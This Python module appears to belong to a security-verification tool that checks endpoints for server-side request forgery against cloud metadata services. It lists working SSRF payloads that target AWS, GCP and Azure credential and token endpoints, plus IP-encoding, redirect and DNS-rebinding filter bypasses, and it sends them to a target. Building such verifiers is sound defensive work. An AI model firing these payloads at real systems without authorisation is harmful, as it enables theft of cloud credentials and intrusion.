"""
src/strategies/ssrf_cloud_metadata.py — SSRF Cloud Metadata verification strategy
Supports AWS, GCP, Azure metadata endpoint patterns.
"""

from __future__ import annotations

import time
import requests

from src.engine import BaseVerifier, TestResult, register


@register
class SSRFCloudMetadataVerifier(BaseVerifier):

    FINDING_TYPE = "ssrf_cloud_metadata"

    # ── Metadata endpoint payloads by cloud provider ──────────────────────────

    PAYLOADS_BY_PROVIDER = {
        "aws": [
            ("TC-01", "imdsv1_root",          "http://169.254.169.254/latest/meta-data/"),
            ("TC-02", "imdsv1_credentials",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("TC-03", "imdsv1_user_data",     "http://169.254.169.254/latest/user-data"),
            ("TC-04", "imdsv2_token_request", "http://169.254.169.254/latest/api/token"),
        ],
        "gcp": [
            ("TC-01", "gcp_metadata_root",        "http://metadata.google.internal/computeMetadata/v1/"),
            ("TC-02", "gcp_service_account",      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            ("TC-03", "gcp_project_id",           "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
        ],
        "azure": [
            ("TC-01", "azure_metadata_root",      "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("TC-02", "azure_managed_identity",   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
        ],
    }

    COMMON_BYPASS_PAYLOADS = [
        ("TC-A1", "ip_encoding_bypass",    "http://0251.0376.0251.0376/latest/meta-data/"),
        ("TC-A2", "decimal_ip_bypass",     "http://2852039166/latest/meta-data/"),
        ("TC-A3", "ipv6_loopback_bypass",  "http://[::ffff:169.254.169.254]/latest/meta-data/"),
        ("TC-A4", "redirect_bypass",       "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"),
        ("TC-A5", "dns_rebind_simulation", "http://169.254.169.254.xip.io/latest/meta-data/"),
    ]

    # Strings that appear in real cloud metadata responses — canaries for detection
    METADATA_CANARIES = [
        "ami-id", "instance-id", "security-credentials",
        "computeMetadata", "project-id", "subscriptionId",
        "iam", "169.254", "metadata",
    ]

    def build_test_cases(self) -> list[dict]:
        provider = self.metadata.get("cloud_provider", "aws").lower()
        provider_payloads = self.PAYLOADS_BY_PROVIDER.get(provider, self.PAYLOADS_BY_PROVIDER["aws"])
        all_tcs = list(provider_payloads) + list(self.COMMON_BYPASS_PAYLOADS)

        return [
            {
                "test_id":   tc_id,
                "category":  category,
                "payload":   payload,
                "inject_in": "query",
            }
            for tc_id, category, payload in all_tcs
        ]

    def _check_metadata_content(self, body: str) -> bool:
        """Return True if response body contains cloud metadata indicators."""
        body_lower = body.lower()
        return any(c.lower() in body_lower for c in self.METADATA_CANARIES)

    def execute_test(self, tc: dict) -> TestResult:
        # Determine method and path from endpoint
        method, path = self.endpoint.split(" ", 1)
        url = self.base_url + path
        headers = self._build_headers()

        # Inject SSRF payload into query parameter
        params = {self.parameter: tc["payload"]}

        start = time.monotonic()
        status_code = None
        body = ""
        error = None

        try:
            resp = requests.request(
                method,
                url,
                params=params,
                headers=headers,
                timeout=8,
                allow_redirects=False,   # Don't follow redirects — redirect itself is a finding
            )
            elapsed = time.monotonic() - start
            status_code = resp.status_code
            body = resp.text[:3000]

        except requests.exceptions.Timeout:
            elapsed = time.monotonic() - start
            error = "TIMEOUT"
        except requests.exceptions.RequestException as exc:
            elapsed = time.monotonic() - start
            error = str(exc)

        response_hash = self._hash_body(body)

        # SSRF-specific detection
        metadata_in_body = self._check_metadata_content(body)
        redirect_detected = (status_code in (301, 302, 307, 308)) and not error

        extra = [
            ("CONTENT: cloud metadata indicators found in response body — SSRF confirmed", metadata_in_body),
            ("BEHAVIORAL: server issued redirect — potential open redirect enabling SSRF", redirect_detected),
        ]

        if error:
            anomalies = [f"NETWORK: {error}"]
            result = "ERROR"
        else:
            # For SSRF: a successful request to the metadata URL is the anomaly.
            # We expect the server to BLOCK the request (e.g., 400, 403, or filtered body).
            # If status matches baseline (typically 200 from the proxy), check content.
            anomalies = self._detect_anomalies(
                status_code, elapsed, response_hash, body,
                canary=None, extra_checks=extra,
            )
            result = "PASS" if not anomalies else "FAIL"

        return TestResult(
            test_id          = tc["test_id"],
            category         = tc["category"],
            payload          = tc["payload"],
            status_code      = status_code,
            response_time    = round(elapsed, 3),
            response_hash    = response_hash,
            anomalies        = anomalies,
            result           = result,
            raw_body_preview = body[:200],
        )
